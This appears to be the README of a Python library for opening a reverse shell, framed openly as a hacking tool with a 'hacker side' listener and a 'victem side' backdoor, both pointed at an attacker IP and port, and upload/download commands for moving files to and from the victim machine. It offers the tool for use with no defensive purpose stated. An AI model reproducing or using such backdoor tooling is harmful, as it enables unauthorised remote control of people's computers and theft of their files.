# whatever you can ping is what you can hack
a python lib to start a revese shell


 (hacker side):
```
 hacker=Listner("hacker Ip","open port")
 
 hacker.run()
```
 
 
 (victem side):
 
 ```
 victem=backdoor("hacker Ip","open port")
 
 victem.run()
 ```
 Listner must be excted before backdoor
 
 the script allow for donload and upload on hacker side:
 ```
 download "filename with extntion"
 upload "filename with extntion"
 ```
 
